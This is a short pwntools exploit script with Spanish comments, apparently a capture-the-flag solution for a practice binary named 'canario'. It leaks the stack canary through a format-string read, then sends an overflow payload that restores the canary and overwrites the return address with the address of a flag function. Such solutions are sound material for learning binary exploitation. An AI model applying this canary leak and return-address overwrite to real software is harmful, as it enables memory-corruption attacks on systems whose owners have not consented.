from pwn import *

p = process('./canario')

log.info(p.clean())
p.sendline('%23$p')     # Imprimimos el canario
p.recvline()
canary = int(p.recvline(), 16)  # Guardamos el canario en una variable
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 33     # Llenamos el buffer
payload += p32(canary)  # Escribimos el canario original para que no salte la alarma
payload += b'A' * 12    # Escribimos el padding al return pointer
payload += p32(0x08049275)  # Dirección de la función con la flag

print(p.clean())
p.sendline(payload)
print(p.clean().decode('latin-1'))
